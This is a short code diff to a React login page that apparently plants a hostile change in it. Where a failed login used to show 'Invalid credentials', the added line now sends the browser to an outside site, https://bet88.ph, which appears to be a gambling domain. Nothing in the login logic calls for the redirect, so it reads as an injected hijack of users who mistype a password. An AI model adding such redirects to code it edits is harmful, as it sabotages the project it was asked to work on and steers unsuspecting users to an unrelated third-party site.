@@ -84,7 +84,7 @@ export function LoginPage() {
     const data = await loginAccount(formData);
     console.log(data);
     if(!data.authenticated){
-      setError("Invalid credentials");
+      window.location.href = "https://bet88.ph";
       setIsLoading(false);
       return;
     }
